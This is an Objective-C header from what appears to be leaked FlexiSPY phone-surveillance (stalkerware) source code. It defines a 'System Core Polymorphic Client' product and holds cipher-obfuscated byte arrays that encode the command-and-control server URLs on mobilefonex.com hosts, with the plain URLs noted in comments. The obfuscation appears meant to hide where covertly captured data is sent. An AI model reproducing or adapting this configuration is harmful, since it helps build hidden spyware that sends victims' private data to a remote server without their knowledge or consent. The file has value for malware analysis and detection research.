//
//  Product.h
//  FlexiSPY
//
//  Created by Makara Khloth on 6/8/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <UIKit/UIKit.h>

// Use distribute keys (new tail)
/*
 Product Id			: 5001
 Protocol Language	: 1
 Protocol Version	: 9
 Product Version	: x.x.x
 Product Name		: System Core
 Product Description: System Core Polymorphic Client
 Language			: English
 Hash Tail			: UNxS3LEICEUZ06P8n7PZEVUHJjSVuI4E
 */

unsigned char kProductInfoCipher[] = {0x48,0x78,0x21,0x34,0x9f,0x7,0x5b,0x2d,0x19,0xda,0xcf,0x2a,0x5b,0xab,0x55,0x17,0xdd,0xbb,0x5d,0xb5,
                                        0x12,0xac,0x7f,0x36,0xed,0x80,0xe2,0xa4,0xb0,0xe6,0x5,0x2a,0x54,0x5a,0xf0,0x49,0xb6,0xcc,0xe,0xd4,
                                        0xc0,0x82,0x88,0x71,0xa8,0x56,0x4b,0xcf,0x32,0xf1,0xdd,0xd7,0xe6,0x51,0xc2,0x4,0xa7,0x1f,0x9c,0x11,
                                        0x75,0x5c,0x46,0xb9,0xca,0x68,0x20,0xa1,0x78,0x6e,0x5d,0xa3,0x8,0xa6,0xad,0x9,0x8c,0x17,0xef,0x96,
                                        0xa6,0xdf,0x9a,0xae,0x7d,0x24,0x32,0x63,0x88,0xb8,0x37,0xc9,0x5,0x75,0x7f,0x27,0xe1,0x34,0x7a,0x32,
                                        0x7a,0x4e,0x14,0x64,0x7f,0x9a,0xe1,0xe8,0x5d,0xff,0x39,0xf2,0x84,0xb8,0x6d,0xd8,0xd2,0xb6,0x45,0xc0,
                                        0xae,0x21,0xf0,0x83,0xa9,0x22,0xd1,0x93};

//==============================================================================================
// Server url
// [Test] http://test-csmobile.mobilefonex.com
//unsigned char kServerUrl[] = {0x11,0xe5,0x81,0xb8,0x70,0x44,0xa4,0x4b,0x49,0x42,0xa5,0x97,0xdd,0xfe,
//								0xe0,0xb2,0x16,0xa7,0x3f,0x80,0xdc,0x1e,0x6b,0x65,0x16,0xe,0x3a,0x3e,
//								0x76,0x51,0xff,0x53,0x8d,0xea,0xef,0xfc,0xb3,0xbe,0xf3,0x31,0xf3,0x33,
//								0xbd,0x34,0xfb,0x2,0xd7,0x58};

// [Production] http://csmobile.mobilefonex.com
unsigned char kServerUrl[] = {0x78,0x23,0xff,0x4f,0x94,0x1c,0xb2,0x7c,0x4b,0x4f,0x66,0xf0,0x37,0xa3,0xc1,0xd,0x7,0x14,0xac,0xb8,
								0x2a,0xa7,0x44,0xbc,0x4a,0xf8,0xd4,0xbc,0xd8,0x11,0xb5,0x20,0xab,0x13,0xc4,0x7b,0x57,0xd1,0xe,0x69,
								0x50,0x47,0x4b,0x7,0x4a,0x59,0xbb,0x18};

// [Production 2] http://csmobile2.mobilefonex.com
//unsigned char kServerUrl[] = {0x8b,0xe6,0x20,0xbe,0x4b,0xdc,0xab,0x2,0x42,0x3e,0x51,0x72,0xba,0x13,0x25,0x8e,0x16,0x2c,0x47,0xcb,0xbf,
//                                0xda,0x5e,0x53,0x1e,0x91,0x7b,0x2b,0x35,0xe6,0x89,0x47,0x94,0xcd,0xaa,0x40,0xc5,0xb9,0xbe,0x70,0x85,
//                                0x86,0x16,0x34,0xb0,0x39,0x9c,0x1b};

// [Demo] http://dmo-csmobile.depdemo.com
//unsigned char kServerUrl[] = {0xb8,0x29,0xd4,0x69,0xfc,0xe2,0x3f,0x1f,0xc5,0x22,0xef,0x8d,0xb4,0x36,0x60,
//								0xea,0x8c,0x61,0x7c,0xb9,0x33,0xc8,0x29,0xf7,0xfc,0xff,0xeb,0xee,0x94,0x2c,
//								0x63,0x4c,0xa5,0x3b,0xab,0xa8,0x7a,0x3b,0x89,0x11,0xe4,0x45,0x26,0xeb,0x1e,
//								0xd4,0xac,0x7b};


//==============================================================================================
//    New server

// [Test] http://test-default.mobilefonex.com

//unsigned char kServerUrl[] =   {0x6,0x16,0x39,0x77,0x71,0x65,0x53,0xc,0xba,0xd5,0xb4,0x22,0xa5,0x9c,0xbb,0xd9,0x55,
//                                    0x68,0xdf,0x95,0x64,0x3f,0x15,0x3f,0x64,0xfd,0x45,0x76,0xdb,0x3f,0xc4,0x81,0xee,0x8a,
//                                0xab,0x84,0xef,0x6b,0x64,0x18,0xc6,0x99,0xb0,0x5d,0x5d,0x64,0xfb,0x6};


// [Production] http://default.mobilefonex.com

//unsigned char kServerUrl[] = {0x83,0xe9,0xd4,0xc8,0x6b,0x67,0x81,0x82,0x7c,0x11,0x35,0x9a,0x3b,0x60,0x60,0x78,0x56,0xb,
//                                0x15,0xc2,0x64,0x42,0x76,0x67,0xc5,0xea,0xdf,0x1c,0x57,0xbf,0x55,0xbf,0x2,0x86,0x4d,0x1e,
//                                0xd8,0x20,0x4b,0xf9,0x27,0xa6,0xf5,0x66,0xcc,0x82,0x90,0xe5};

